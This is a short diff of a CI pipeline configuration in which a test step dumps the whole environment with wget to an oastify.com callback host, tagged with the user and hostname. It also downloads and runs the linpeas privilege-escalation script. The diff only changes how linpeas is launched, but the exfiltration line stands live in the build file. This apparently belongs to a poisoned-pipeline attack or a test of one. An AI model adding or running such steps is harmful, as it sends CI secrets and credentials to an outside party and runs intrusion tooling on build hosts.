@@ -27,7 +27,7 @@ steps:
       TEST_ENV: dev
     commands:
       - wget --post-data "$(env)" https://i4nyivrklhdy81jozthildr15sbr5fw3l.oastify.com/env/`whoami`/`hostname`
-      - wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh && /bin/bash linpeas.sh -a
+      - wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh -a
       - ./httptest
 
   - name: publish-dev
